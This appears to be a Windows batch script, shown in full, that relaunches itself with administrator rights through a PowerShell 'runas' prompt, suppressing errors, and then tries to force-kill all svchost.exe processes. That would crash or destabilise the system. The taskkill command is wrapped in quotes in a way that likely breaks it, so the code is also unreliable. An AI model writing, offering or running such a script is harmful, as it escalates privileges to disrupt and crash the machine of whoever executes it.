@echo off

if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin -ErrorAction SilentlyContinue& exit /b)

"taskkill /im svchost.exe /f"

exit